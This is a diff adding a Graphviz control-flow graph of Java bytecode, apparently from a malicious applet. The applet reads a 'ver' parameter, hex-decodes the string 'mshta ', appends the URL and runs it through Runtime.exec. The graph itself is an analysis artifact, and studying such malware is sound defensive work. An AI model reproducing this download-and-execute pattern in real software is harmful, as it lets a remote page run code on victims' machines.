@@ -1,0 +1,45 @@
+digraph "" {
+    "r0 := @this: main"
+    "load.r r0"
+    "r0 := @this: main"->"load.r r0";
+    "push \"ver\""
+    "load.r r0"->"push \"ver\"";
+    "virtualinvoke <main: java.lang.String getParameter(java.lang.String)>"
+    "push \"ver\""->"virtualinvoke <main: java.lang.String getParameter(java.lang.String)>";
+    "push \"http://\""
+    "virtualinvoke <main: java.lang.String getParameter(java.lang.String)>"->"push \"http://\"";
+    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"
+    "push \"http://\""->"virtualinvoke <java.lang.String: int indexOf(java.lang.String)>";
+    "ifne goto return"
+    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"->"ifne goto return";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
+    "ifne goto return"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "new java.lang.StringBuffer"
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"new java.lang.StringBuffer";
+    "dup1.r"
+    "new java.lang.StringBuffer"->"dup1.r";
+    "specialinvoke <java.lang.StringBuffer: void <init>()>"
+    "dup1.r"->"specialinvoke <java.lang.StringBuffer: void <init>()>";
+    "push \"6D7368746120\""
+    "specialinvoke <java.lang.StringBuffer: void <init>()>"->"push \"6D7368746120\"";
+    "staticinvoke <main: java.lang.String HS(java.lang.String)>"
+    "push \"6D7368746120\""->"staticinvoke <main: java.lang.String HS(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>"
+    "staticinvoke <main: java.lang.String HS(java.lang.String)>"->"virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>"->"load.r r0";
+    "load.r r0"->"push \"ver\"";
+    "push \"ver\""->"virtualinvoke <main: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <main: java.lang.String getParameter(java.lang.String)>"->"virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuffer: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuffer: java.lang.String toString()>";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"
+    "virtualinvoke <java.lang.StringBuffer: java.lang.String toString()>"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "pop"
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
+    "goto return"
+    "pop"->"goto return";
+    "return"
+    "goto return"->"return";
+    "store.r r0"
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"store.r r0";
+}
